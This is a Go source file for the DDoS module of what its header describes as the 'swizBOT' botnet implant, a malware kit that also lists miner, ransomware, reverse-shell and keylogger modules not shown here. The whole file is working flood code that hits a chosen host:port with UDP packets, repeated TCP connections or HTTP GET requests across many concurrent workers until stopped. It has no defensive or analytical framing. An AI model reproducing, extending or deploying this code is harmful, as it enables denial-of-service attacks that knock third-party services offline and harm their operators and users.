// Package plugins provides the swizBOT implant action modules:
// DDoS, miner, ransomware, reverse shell, and keylogger.
package plugins

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// DDoS runs a traffic flood against one target using a single method.
// Methods: udp, tcp, http. The flood runs until Stop is called.
type DDoS struct {
	target string
	method string

	cancel context.CancelFunc
	wg     sync.WaitGroup

	sent atomic.Int64
	errs atomic.Int64
}

// NewDDoS creates a flooder for host:port target.
func NewDDoS(target, method string) *DDoS {
	return &DDoS{target: target, method: strings.ToLower(method)}
}

// Validate checks the target and method before any traffic is sent.
func (d *DDoS) Validate() error {
	if _, _, err := net.SplitHostPort(d.target); err != nil {
		return fmt.Errorf("target must be host:port (%q)", d.target)
	}
	switch d.method {
	case "udp", "tcp", "http":
		return nil
	default:
		return fmt.Errorf("method must be udp, tcp or http (got %q)", d.method)
	}
}

// Start launches the flood and blocks until Stop is called.
func (d *DDoS) Start() {
	ctx, cancel := context.WithCancel(context.Background())
	d.cancel = cancel
	defer cancel()

	switch d.method {
	case "udp":
		d.udpFlood(ctx, 32)
	case "tcp":
		d.tcpFlood(ctx, 128)
	case "http":
		d.httpFlood(ctx, 64)
	}
	d.wg.Wait()
}

// Stop terminates the flood and waits for workers to exit.
func (d *DDoS) Stop() {
	if d.cancel != nil {
		d.cancel()
	}
	d.wg.Wait()
}

// Stats reports packets/sockets sent and transport errors so far.
func (d *DDoS) Stats() (sent, errs int64) {
	return d.sent.Load(), d.errs.Load()
}

func (d *DDoS) udpFlood(ctx context.Context, workers int) {
	addr, err := net.ResolveUDPAddr("udp", d.target)
	if err != nil {
		d.errs.Add(1)
		return
	}
	payload := make([]byte, 1400)
	for i := 0; i < workers; i++ {
		d.wg.Add(1)
		go func() {
			defer d.wg.Done()
			conn, err := net.DialUDP("udp", nil, addr)
			if err != nil {
				d.errs.Add(1)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if _, err := conn.Write(payload); err != nil {
					d.errs.Add(1)
					return
				}
				d.sent.Add(1)
			}
		}()
	}
}

func (d *DDoS) tcpFlood(ctx context.Context, workers int) {
	for i := 0; i < workers; i++ {
		d.wg.Add(1)
		go func() {
			defer d.wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", d.target, 3*time.Second)
				if err != nil {
					d.errs.Add(1)
					time.Sleep(50 * time.Millisecond)
					continue
				}
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: target\r\n\r\n"))
				conn.Close()
				d.sent.Add(1)
			}
		}()
	}
}

func (d *DDoS) httpFlood(ctx context.Context, workers int) {
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: workers,
			DisableKeepAlives:   false,
		},
		Timeout: 10 * time.Second,
	}
	url := "http://" + d.target
	for i := 0; i < workers; i++ {
		d.wg.Add(1)
		go func() {
			defer d.wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				resp, err := client.Get(url)
				if err != nil {
					d.errs.Add(1)
					continue
				}
				resp.Body.Close()
				d.sent.Add(1)
			}
		}()
	}
}
